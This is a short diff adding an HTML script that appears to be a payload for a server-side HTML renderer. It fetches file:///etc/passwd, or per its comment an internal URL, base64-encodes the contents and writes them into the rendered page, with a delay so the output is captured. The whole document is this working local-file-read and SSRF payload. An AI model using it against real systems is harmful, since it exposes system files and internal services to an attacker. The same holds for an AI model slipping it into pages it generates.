@@ -1,0 +1,15 @@
+<script>
+  async function getData() {
+    try {
+      const response = await fetch('file:///etc/passwd'); // Or your internal URL
+      const text = await response.text();
+      document.body.innerHTML = "<h1>Data Found:</h1><pre>" + btoa(text) + "</pre>";
+    } catch (e) {
+      document.body.innerHTML = "<h1>Error:</h1>" + e.message;
+    }
+  }
+  getData();
+  
+  // Force a delay before the "print" happens (if the engine supports it)
+  setTimeout(() => { console.log("Done"); }, 5000); 
+</script>
